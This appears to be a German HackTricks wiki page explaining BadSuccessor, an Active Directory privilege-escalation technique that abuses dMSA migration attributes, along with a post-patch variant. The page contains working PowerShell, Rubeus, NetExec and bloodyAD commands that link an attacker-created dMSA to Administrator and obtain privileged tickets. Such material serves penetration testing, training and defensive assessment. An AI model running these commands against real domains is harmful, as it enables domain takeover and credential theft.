# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

**BadSuccessor** missbraucht den in **Windows Server 2025** eingeführten Migrationsworkflow für **delegated Managed Service Accounts** (**dMSA**). Ein dMSA kann über **`msDS-ManagedAccountPrecededByLink`** mit einem Legacy-Konto verknüpft und durch die in **`msDS-DelegatedMSAState`** gespeicherten Migrationszustände geführt werden. Wenn ein Angreifer ein dMSA in einer beschreibbaren OU erstellen und diese Attribute kontrollieren kann, kann der KDC Tickets für das vom Angreifer kontrollierte dMSA mit dem **Autorisierungskontext des verknüpften Kontos** ausstellen.<sup>[[2]](#references)</sup>

In der Praxis bedeutet das, dass ein Benutzer mit geringen Berechtigungen, der nur delegierte OU-Rechte hat, ein neues dMSA erstellen, es auf `Administrator` verweisen lassen, den Migrationszustand abschließen und anschließend ein TGT erhalten kann, dessen PAC privilegierte Gruppen wie **Domain Admins** enthält.<sup>[[2]](#references)</sup>

## Relevante Details zur dMSA-Migration

- dMSA ist ein Feature von **Windows Server 2025**.
- `Start-ADServiceAccountMigration` setzt die Migration auf den Zustand **started**.
- `Complete-ADServiceAccountMigration` setzt die Migration auf den Zustand **completed**.
- `msDS-DelegatedMSAState = 1` bedeutet, dass die Migration gestartet wurde.
- `msDS-DelegatedMSAState = 2` bedeutet, dass die Migration abgeschlossen wurde.
- Bei einer legitimen Migration soll das dMSA das abgelöste Konto transparent ersetzen. Daher erhalten KDC/LSA den Zugriff, den das vorherige Konto bereits hatte.<sup>[[3]](#references)</sup>

Microsoft Learn weist außerdem darauf hin, dass während der Migration das ursprüngliche Konto an das dMSA gebunden ist und das dMSA auf die Ressourcen zugreifen soll, auf die auch das alte Konto zugreifen konnte.<sup>[[3]](#references)</sup> Diese Sicherheitsannahme missbraucht BadSuccessor.<sup>[[2]](#references)</sup>

## Voraussetzungen

1. Eine Domäne, in der **dMSA vorhanden ist**. Das bedeutet, dass auf AD-Seite **Windows Server 2025** unterstützt wird.
2. Der Angreifer kann in einer OU **`msDS-DelegatedManagedServiceAccount`-Objekte erstellen** oder verfügt dort über gleichwertige, umfassende Berechtigungen zum Erstellen untergeordneter Objekte.
3. Der Angreifer kann die relevanten dMSA-Attribute **schreiben** oder das gerade erstellte dMSA vollständig kontrollieren.
4. Der Angreifer kann Kerberos-Tickets aus einem in die Domäne eingebundenen Kontext oder über einen Tunnel anfordern, der LDAP/Kerberos erreicht.<sup>[[2]](#references)</sup>

### Praktische Prüfungen

Das eindeutigste Signal für den Operator ist, die Domänen-/Forest-Ebene zu prüfen und zu bestätigen, dass die Umgebung bereits den neuen Server-2025-Stack verwendet:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

Wenn du Werte wie `Windows2025Domain` und `Windows2025Forest` siehst, solltest du **BadSuccessor / dMSA migration abuse** vorrangig überprüfen.

Du kannst außerdem mit öffentlichen Tools OUs enumerieren, für die delegierte Berechtigungen zum Erstellen von dMSAs bestehen:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Missbrauchsablauf

1. Erstellen Sie eine dMSA in einer OU, in der Sie delegierte Rechte zum Erstellen untergeordneter Objekte haben.
2. Setzen Sie **`msDS-ManagedAccountPrecededByLink`** auf den DN eines privilegierten Ziels, z. B. `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Setzen Sie **`msDS-DelegatedMSAState`** auf `2`, um die Migration als abgeschlossen zu markieren.
4. Fordern Sie ein TGT für die neue dMSA an und verwenden Sie das zurückgegebene Ticket, um auf privilegierte Dienste zuzugreifen.<sup>[[2]](#references)</sup>

PowerShell-Beispiel:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Ticket-Anfrage / Beispiele für operative Tools:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Warum dies mehr als eine Rechteausweitung ist

Bei einer legitimen Migration muss Windows der neuen dMSA auch ermöglichen, Tickets zu verarbeiten, die vor der Umstellung für das vorherige Konto ausgestellt wurden. Deshalb kann dMSA-bezogenes Ticketmaterial im **`KERB-DMSA-KEY-PACKAGE`**-Ablauf sowohl **aktuelle** als auch **vorherige** Schlüssel enthalten.<sup>[[2]](#references)</sup>

Bei einer vom Angreifer kontrollierten gefälschten Migration kann dieses Verhalten BadSuccessor zu Folgendem machen:<sup>[[2]](#references)</sup>

- **Rechteausweitung** durch Übernahme privilegierter Gruppen-SIDs im PAC.
- **Offenlegung von Zugangsdatenmaterial**, da die Verarbeitung vorheriger Schlüssel in anfälligen Workflows Material offenlegen kann, das dem RC4-/NT-Hash des Vorgängerkontos entspricht.

Dadurch ist die Technik sowohl für die direkte Übernahme der Domäne als auch für nachgelagerte Aktionen wie pass-the-hash oder eine umfassendere Kompromittierung von Zugangsdaten nützlich.

## BetterSuccessor nach dem KDC-Patch

Der gepatchte KDC validiert beide Seiten einer dMSA-Migration. Zusätzlich zur `msDS-ManagedAccountPrecededByLink`-Verknüpfung und dem Migrationsstatus der dMSA muss das Vorgängerkonto über `msDS-SupersededManagedAccountLink` zurück auf die dMSA verweisen und einen kompatiblen `msDS-SupersededServiceAccountState` aufweisen. Eine einseitige Verknüpfung schlägt nun fehl; ein Konto, das nur eine dMSA erstellen kann, kann keinen beliebigen Vorgänger festlegen. Mit `CreateChild` für eine dMSA in einer OU **und** effektivem Schreibzugriff auf die Migrationsattribute des ausgewählten Zielkontos kann ein Angreifer die wechselseitige Verknüpfung herstellen. Das resultierende dMSA-Ticket kann den Autorisierungskontext des Vorgängerkontos übernehmen und dessen Schlüssel im dMSA-Schlüsselpaket offenlegen. Dies ist ein gezielter Pfad zum Zugriff auf Zugangsdaten und zur Rechteausweitung, kein Beleg dafür, dass der ursprüngliche BadSuccessor mit beliebigem Ziel auf gepatchten DCs weiterhin ausnutzbar ist.<sup>[[5]](#references)[[6]](#references)</sup>

In einer Laborumgebung, in der der Schreibzugriff auf das Zielkonto bestätigt wurde, kann `bloodyAD` die dMSA erstellen und die zusammengehörigen Migrationsattribute schreiben. Fordere das dMSA-Ticket mit dem zurückgegebenen Kerberos-Material an und überprüfe die tatsächlichen Berechtigungen des Zielkontos, bevor du davon ausgehst, dass dessen Berechtigungen oder Hash erlangt wurden. Der Name des Unterbefehls `badSuccessor` des Tools bedeutet nicht, dass das nicht gepatchte einseitige Verhalten verwendet wird.<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## Hinweise zum Patch-Status

Das ursprüngliche BadSuccessor-Verhalten ist **nicht nur ein theoretisches Preview-Problem aus dem Jahr 2025**. Microsoft hat ihm die **CVE-2025-53779** zugewiesen und im **August 2025** ein Sicherheitsupdate veröffentlicht.<sup>[[4]](#references)</sup> Dokumentiere diesen Angriff weiterhin für:

- **Labs / CTFs / assume-breach-Übungen**
- **ungepatchte Windows-Server-2025-Umgebungen**
- **Validierung von OU-Delegierungen und dMSA-Exposition bei Assessments**

Gehe nicht davon aus, dass eine Windows-Server-2025-Domäne allein deshalb verwundbar ist, weil dMSA vorhanden ist; überprüfe den Patch-Stand und teste sorgfältig.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor-dMSA-Missbrauch zur Domain-Admin-Eskalation (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: dMSA-Missbrauch zur Rechteausweitung in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Übersicht über delegierte verwaltete Dienstkonten](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - BadSuccessor ist tot, lang lebe BadSuccessor(?) ](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor: dMSA-Missbrauch nach dem Patch geht weiter](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
